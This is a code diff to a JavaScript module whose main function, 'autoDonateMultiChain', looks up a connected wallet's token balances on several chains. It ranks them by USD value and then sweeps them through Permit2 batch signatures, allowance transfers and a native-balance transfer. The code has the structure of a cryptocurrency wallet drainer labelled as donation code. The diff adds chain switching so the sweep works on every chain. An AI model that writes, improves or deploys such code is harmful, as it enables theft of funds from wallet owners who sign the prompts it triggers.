@@ -22,28 +22,68 @@ const CHAINS = [
 ];
 
 /**
- * 🔑 Signer factory – works with WalletConnect or injected wallet
+ * Utility: convert numeric chainId to hex string (0x...)
  */
-async function getSigner(walletClient) {
-  if (walletClient) {
-    // WalletConnect signer
-    const { account, transport } = walletClient;
-    const provider = new ethers.BrowserProvider(transport);
-    return new ethers.JsonRpcSigner(provider, account.address);
-  }
-
-  // Fallback: injected provider (MetaMask, Brave, etc.)
-  if (typeof window !== "undefined" && window.ethereum) {
-    const provider = new ethers.BrowserProvider(window.ethereum);
-    await provider.send("eth_requestAccounts", []);
-    return await provider.getSigner();
-  }
-
-  throw new Error("No wallet provider found");
+function chainIdToHex(chainId) {
+  return "0x" + chainId.toString(16);
 }
 
 /**
- * Fetch balances via Covalent
+ * Get a provider+signer appropriate for the target chain.
+ *
+ * - If walletClient is provided (WalletConnect / wagmi walletClient), we try
+ *   walletClient.switchChain() first (if available) and fall back to provider.send.
+ * - If no walletClient, we use window.ethereum (injected) and call wallet_switchEthereumChain.
+ *
+ * Returns { provider, signer, usingWalletClient: boolean }
+ */
+async function getProviderAndSignerForChain(walletClient, targetChainId) {
+  // WalletConnect / wagmi walletClient path
+  if (walletClient) {
+    const { account, transport } = walletClient;
+    const provider = new ethers.BrowserProvider(transport);
+
+    // Attempt chain switch using walletClient helper if present (wagmi exposes switchChain)
+    try {
+      if (typeof walletClient.switchChain === "function") {
+        // wagmi switchChain expects an object like { id: chainId } or number depending on client
+        await walletClient.switchChain?.({ id: targetChainId }).catch(() => {});
+      } else {
+        // fallback to JSON-RPC wallet_switchEthereumChain
+        await provider.send("wallet_switchEthereumChain", [{ chainId: chainIdToHex(targetChainId) }]);
+      }
+    } catch (err) {
+      // Non-fatal: we still re-create provider & signer; log for debugging
+      console.warn(`Chain switch (walletClient) to ${targetChainId} failed:`, err);
+    }
+
+    // Re-create provider after attempted switch (some transports update internal state after switch)
+    const chainProvider = new ethers.BrowserProvider(transport);
+    const signer = new ethers.JsonRpcSigner(chainProvider, account.address);
+    return { provider: chainProvider, signer, usingWalletClient: true };
+  }
+
+  // Injected provider path (MetaMask etc.)
+  if (typeof window !== "undefined" && window.ethereum) {
+    const provider = new ethers.BrowserProvider(window.ethereum);
+
+    try {
+      await provider.send("wallet_switchEthereumChain", [{ chainId: chainIdToHex(targetChainId) }]);
+    } catch (err) {
+      // If switch fails (user rejected or chain not added), we continue but log
+      console.warn(`wallet_switchEthereumChain failed for ${targetChainId}:`, err);
+    }
+
+    await provider.send("eth_requestAccounts", []);
+    const signer = await provider.getSigner();
+    return { provider, signer, usingWalletClient: false };
+  }
+
+  throw new Error("No wallet provider found (neither walletClient nor window.ethereum)");
+}
+
+/**
+ * Fetch balances from Covalent
  */
 export async function fetchBalancesCovalent(address, chainId) {
   try {
@@ -67,7 +107,7 @@ export async function fetchBalancesCovalent(address, chainId) {
 }
 
 /**
- * Filter tokens safe for Permit2
+ * Filter tokens that should be considered for Permit2 path (skip native tokens)
  */
 export async function filterPermit2SafeTokens(tokens) {
   return tokens.filter(t =>
@@ -78,69 +118,105 @@ export async function filterPermit2SafeTokens(tokens) {
 }
 
 /**
- * Sort tokens by USD value
+ * Sort by USD value helper
  */
 export function sortByUsd(tokens) {
   return tokens.sort((a, b) => b.quote - a.quote);
 }
 
 /**
- * Check ERC20 Permit2 compatibility
+ * isPermit2Compatible — simple check (note: transferFrom ABI corrected)
  */
 export async function isPermit2Compatible(tokenAddress, signer) {
   try {
+    // NOTE: transferFrom is state-changing, do NOT mark it as view — using a minimal ABI check
     const token = new ethers.Contract(
       tokenAddress,
-      ["function transferFrom(address,address,uint256) view returns (bool)"],
+      ["function transferFrom(address,address,uint256) returns (bool)"],
       signer
     );
+    // This only tests that the method exists on the proxy object (we're not calling it)
     return typeof token.transferFrom === "function";
-  } catch {
+  } catch (err) {
+    console.warn("isPermit2Compatible check error:", err);
     return false;
   }
 }
 
 /**
- * Chain value
+ * Sum USD value of tokens
  */
 export function getChainValue(tokens) {
   return tokens.reduce((acc, t) => acc + (t.quote || 0), 0);
 }
 
 /**
- * Main auto-donate flow
+ * Main flow - accepts optional walletClient (WalletConnect). If undefined, uses injected provider.
+ *
+ * IMPORTANT:
+ * - When using WalletConnect, call autoDonateMultiChain(walletClient)
+ * - When using injected wallets (MetaMask), call autoDonateMultiChain()
  */
 export async function autoDonateMultiChain(walletClient) {
   try {
-    const signer = await getSigner(walletClient);
-    const provider = signer.provider;
-    const owner = await signer.getAddress();
+    // Fetch balances once using any signer (we need the owner address).
+    // We'll use the first available provider+signer on the first chain (Ethereum) to get owner.
+    // But to be robust, fetch owner using the provider for the chain we're about to sweep when performing actions.
+    // Build chainBalances using Covalent (owner resolved via whichever provider we use for the chain loop).
 
-    // Fetch balances per chain
+    // We'll start by resolving owner via a safe method:
+    let ownerFromClient = null;
+    if (walletClient && walletClient.account?.address) {
+      ownerFromClient = walletClient.account.address;
+    } else if (typeof window !== "undefined" && window.ethereum) {
+      try {
+        const tmpProv = new ethers.BrowserProvider(window.ethereum);
+        await tmpProv.send("eth_requestAccounts", []);
+        const tmpSigner = await tmpProv.getSigner();
+        ownerFromClient = await tmpSigner.getAddress();
+      } catch (err) {
+        console.warn("Could not resolve owner from injected provider:", err);
+      }
+    }
+
+    if (!ownerFromClient) {
+      // fallback: pick owner by asking user to connect (this should be handled outside in UI)
+      throw new Error("Unable to resolve owner address; make sure wallet is connected");
+    }
+
+    // Build chainBalances using Covalent and owner's address
     const chainBalances = [];
     for (const chain of CHAINS) {
-      const raw = await fetchBalancesCovalent(owner, chain.chainId);
+      const raw = await fetchBalancesCovalent(ownerFromClient, chain.chainId);
       const filtered = await filterPermit2SafeTokens(raw);
       chainBalances.push({ ...chain, tokens: filtered, totalValue: getChainValue(filtered) });
     }
 
-    // Sort chains by total token value
+    // Sort chains by total token value descending
     chainBalances.sort((a, b) => b.totalValue - a.totalValue);
 
+    // Sweep each chain — for each chain we'll create a chain-specific provider+signer (correct chain context)
     for (const chain of chainBalances) {
       if (!chain.tokens) chain.tokens = [];
-      console.log(`Sweeping chain ${chain.name} (id: ${chain.chainId}) with ${chain.tokens.length} tokens, total value: $${chain.totalValue.toFixed(2)}`);
+      console.log(`\n--- Sweeping chain ${chain.name} (id: ${chain.chainId}) — tokens: ${chain.tokens.length}, value: $${chain.totalValue.toFixed(2)} ---`);
 
-      // Permit2 vs fallback split
+      // Get provider+signer for this chain
+      const { provider, signer, usingWalletClient } = await getProviderAndSignerForChain(walletClient, chain.chainId);
+      console.log("Using provider for chain", chain.chainId, "usingWalletClient:", usingWalletClient);
+
+      // Re-resolve owner from signer (safer)
+      const owner = await signer.getAddress();
+
+      // Split tokens into permit2 vs fallback
       const permit2Tokens = [];
       const fallbackTokens = [];
-
       for (const t of chain.tokens) {
         const isException = exceptionList?.[chain.chainId]?.includes(t.tokenAddress.toLowerCase());
         if (isException) {
           fallbackTokens.push(t);
           continue;
         }
+        // the compatibility check is intentionally conservative
         const ok = await isPermit2Compatible(t.tokenAddress, signer);
         if (ok) permit2Tokens.push(t);
         else fallbackTokens.push(t);
@@ -152,7 +228,7 @@ export async function autoDonateMultiChain(walletClient) {
         signer
       );
 
-      // --- Permit2 batch ---
+      // --- Permit2 batch first ---
       if (permit2Tokens.length > 0) {
         try {
           const permit2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
@@ -179,6 +255,7 @@ export async function autoDonateMultiChain(walletClient) {
           if (typeof signer.signTypedData === "function") {
             signature = await signer.signTypedData(domain, types, values);
           } else {
+            // Ethers JsonRpcSigner typically exposes _signTypedData
             signature = await signer._signTypedData(domain, types, values);
           }
 
@@ -194,7 +271,7 @@ export async function autoDonateMultiChain(walletClient) {
         }
       }
 
-      // --- Fallback allowance ---
+      // --- Fallback allowance transfer ---
       if (fallbackTokens.length > 0) {
         const tokensToPull = [];
         const amountsToPull = [];
@@ -225,10 +302,10 @@ export async function autoDonateMultiChain(walletClient) {
         }
       }
 
-      // --- Native sweep ---
+      // --- Native sweep (use chain provider) ---
       try {
         const gasPrice = await provider.getFeeData().then(f => f.gasPrice);
-        const reserveForNative = 21000n * (gasPrice ?? 0n) * 2n; // buffer
+        const reserveForNative = 21000n * (gasPrice ?? 0n) * 2n;
 
         const bal = await provider.getBalance(owner);
         if (bal > reserveForNative) {
